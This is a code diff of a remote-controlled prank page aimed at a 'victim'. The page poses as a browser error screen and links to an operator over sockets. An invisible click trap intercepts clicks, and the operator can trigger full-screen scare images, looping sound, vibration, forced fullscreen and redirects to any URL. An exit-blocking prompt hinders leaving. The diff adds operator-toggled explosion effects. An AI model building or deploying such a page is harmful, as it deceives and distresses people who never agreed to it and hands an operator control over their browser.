@@ -31,7 +31,6 @@
             z-index: 10;
         }
 
-        /* Тот самый динозаврик */
         .dino-container { margin-bottom: 40px; }
 
         .dino-icon {
@@ -72,20 +71,77 @@
 
         #details-content { display: none; margin-top: 15px; font-size: 13px; }
 
-        /* Пранк-шар */
         #prank-view {
             display: none; position: fixed; top: 0; left: 0;
             width: 100%; height: 100%;
             background: black no-repeat center center;
-            background-size: contain; /* Щоб картинка влазила */
+            background-size: contain;
             background-color: black;
             z-index: 9999;
         }
 
-        /* Невидима пастка для кліків */
         #click-trap {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             z-index: 999; cursor: default;
+        }
+
+        /* === ЭФФЕКТ ВЗРЫВОВ === */
+        .explosion {
+            position: fixed;
+            pointer-events: none;
+            z-index: 10000;
+        }
+
+        .explosion::before,
+        .explosion::after {
+            content: '';
+            position: absolute;
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            animation: explode 0.6s ease-out forwards;
+        }
+
+        .explosion::before {
+            background: radial-gradient(circle, rgba(255,100,0,0.8) 0%, rgba(255,200,0,0.4) 50%, transparent 100%);
+        }
+
+        .explosion::after {
+            background: radial-gradient(circle, rgba(255,50,0,0.6) 0%, rgba(255,150,0,0.3) 50%, transparent 100%);
+            animation-delay: 0.1s;
+        }
+
+        @keyframes explode {
+            0% {
+                transform: scale(0);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(3);
+                opacity: 0;
+            }
+        }
+
+        .particle {
+            position: fixed;
+            width: 4px;
+            height: 4px;
+            background: orange;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 10000;
+            animation: particle 1s ease-out forwards;
+        }
+
+        @keyframes particle {
+            0% {
+                transform: translate(0, 0);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(var(--tx), var(--ty));
+                opacity: 0;
+            }
         }
     </style>
 </head>
@@ -151,6 +207,7 @@
         // ЗМІННІ СТАНУ
         let isAutoMode = false;
         let hasInteracted = false;
+        let explosionsEnabled = false;
 
         // Вхід у кімнату
         socket.emit('join-room-victim', { roomId: id, userAgent: navigator.userAgent });
@@ -172,14 +229,19 @@
                 isAutoMode = data.auto;
                 console.log("Auto Mode:", isAutoMode);
                 
-                // Якщо жертва вже клікала раніше і режим увімкнувся - запускаємо
                 if (isAutoMode && hasInteracted) {
                     startChaos();
                 }
             }
+
+            // Оновлюємо статус взрывів
+            if (data.explosions !== undefined) {
+                explosionsEnabled = data.explosions;
+                console.log("Explosions:", explosionsEnabled);
+            }
         });
 
-        // Ручний запуск (Screamer)
+        // Ручний запуск (Детонатор)
         socket.on('play-sound', () => {
             startChaos();
         });
@@ -189,6 +251,68 @@
             window.location.href = data.url;
         });
 
+        // --- ФУНКЦІЯ СТВОРЕННЯ ВИБУХУ ---
+        function createExplosion(x, y) {
+            const explosion = document.createElement('div');
+            explosion.className = 'explosion';
+            explosion.style.left = (x - 50) + 'px';
+            explosion.style.top = (y - 50) + 'px';
+            document.body.appendChild(explosion);
+
+            // Створюємо частинки
+            for (let i = 0; i < 15; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                
+                const angle = (Math.PI * 2 * i) / 15;
+                const distance = 50 + Math.random() * 100;
+                const tx = Math.cos(angle) * distance;
+                const ty = Math.sin(angle) * distance;
+                
+                particle.style.left = x + 'px';
+                particle.style.top = y + 'px';
+                particle.style.setProperty('--tx', tx + 'px');
+                particle.style.setProperty('--ty', ty + 'px');
+                
+                document.body.appendChild(particle);
+                
+                setTimeout(() => particle.remove(), 1000);
+            }
+
+            setTimeout(() => explosion.remove(), 600);
+        }
+
+        // --- АВТОМАТИЧНІ ВИБУХИ ---
+        let explosionInterval = null;
+
+        function startAutoExplosions() {
+            if (explosionInterval) return;
+            
+            explosionInterval = setInterval(() => {
+                if (explosionsEnabled) {
+                    const x = Math.random() * window.innerWidth;
+                    const y = Math.random() * window.innerHeight;
+                    createExplosion(x, y);
+                }
+            }, 800);
+        }
+
+        function stopAutoExplosions() {
+            if (explosionInterval) {
+                clearInterval(explosionInterval);
+                explosionInterval = null;
+            }
+        }
+
+        // Запускаємо автоматичні вибухи при зміні статусу
+        setInterval(() => {
+            if (explosionsEnabled) {
+                startAutoExplosions();
+            } else {
+                stopAutoExplosions();
+            }
+        }, 100);
+
         // --- ГОЛОВНА ФУНКЦІЯ ХАОСУ ---
         function startChaos() {
             document.getElementById('ui').style.display = 'none';
@@ -196,29 +320,37 @@
             prankView.style.display = 'block';
             
             // 1. Звук
-            if (isAutoMode) audio.loop = true; // Зациклюємо якщо авто
+            if (isAutoMode) audio.loop = true;
             audio.play().catch(e => console.log("Audio block:", e));
 
             // 2. Вібрація
             if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
 
-            // 3. Повний екран (якщо браузер дозволить)
+            // 3. Повний екран
             if (isAutoMode) {
                 try {
                     document.documentElement.requestFullscreen().catch(()=>{});
                 } catch(e){}
             }
+
+            // 4. Запускаємо вибухи якщо увімкнено
+            if (explosionsEnabled) {
+                startAutoExplosions();
+            }
         }
 
         // --- ОБРОБНИК КЛІКІВ ---
-        // Це перехоплює будь-який клік на сторінці (навіть на кнопку "Обновить")
         document.addEventListener('click', () => {
             hasInteracted = true;
             
-            // "Прогріваємо" аудіо (щоб браузер дозволив грати звук потім)
+            // Створюємо вибух на місці кліку якщо увімкнено
+            if (explosionsEnabled) {
+                createExplosion(event.clientX, event.clientY);
+            }
+            
+            // "Прогріваємо" аудіо
             if (audio.src) {
                 audio.play().then(() => {
-                    // Якщо зараз НЕ час для пранку, ставимо на паузу
                     if (!isAutoMode) {
                         audio.pause();
                         audio.currentTime = 0;
@@ -229,13 +361,10 @@
             // Якщо режим AUTO увімкнено - запускаємо пастку
             if (isAutoMode) {
                 startChaos();
-            } else {
-                // Якщо це була кнопка "Обновити", але авто-режим вимкнений,
-                // робимо фейкову анімацію або нічого (імітуємо зависання)
             }
-        }, { capture: true }); // capture: true гарантує перехоплення події до того, як вона дійде до кнопки
+        }, { capture: true });
 
-        // Заборона виходу (працює тільки після взаємодії)
+        // Заборона виходу
         window.onbeforeunload = function() {
             if (isAutoMode) return "Are you sure?";
         };
